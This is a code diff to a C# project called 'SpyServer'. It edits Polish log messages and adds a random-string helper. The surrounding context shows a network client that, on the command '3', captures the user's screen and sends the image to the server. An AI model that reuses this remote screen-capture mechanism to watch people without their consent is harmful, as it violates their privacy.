@@ -55,15 +55,15 @@ namespace SpyServer
             while ((byte_count = ns.Read(receivedBytes, 0, receivedBytes.Length)) > 0)
             {
                 string data = Encoding.ASCII.GetString(receivedBytes, 0, byte_count);
-                WriteInfoAsync("-" + name + " reading:  <<" + data + ">>");
+                WriteInfoAsync("-" + name + " czyta:  <<" + data + ">>");
                 switch (data)
                 {
                     case "2":
-                        WriteInfoAsync("Serwer chce tekst");
-                        SendText("Wysylam tekst");
+                        WriteInfoAsync("Serwer rzada tekstu");
+                        SendText(RandomString(12, false));
                         break;
                     case "3":
-                        WriteInfoAsync("Serwer chce screenshot");
+                        WriteInfoAsync("Serwer rzada zrzutu ekranu");
                         byte[] image = ClientManager.BitmapSourceToByte(ClientManager.CopyScreen());
                         SendImage(image);
                         break;
@@ -103,7 +103,22 @@ namespace SpyServer
                 mainWindow.LogTextBox.Text += text + "\n";
             });
         }
-        
+        // Generate a random string with a given size  
+        public string RandomString(int size, bool lowerCase)
+        {
+            StringBuilder builder = new StringBuilder();
+            Random random = new Random();
+            char ch;
+            for (int i = 0; i < size; i++)
+            {
+                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
+                builder.Append(ch);
+            }
+            if (lowerCase)
+                return builder.ToString().ToLower();
+            return builder.ToString();
+        }
+
     }
 
 
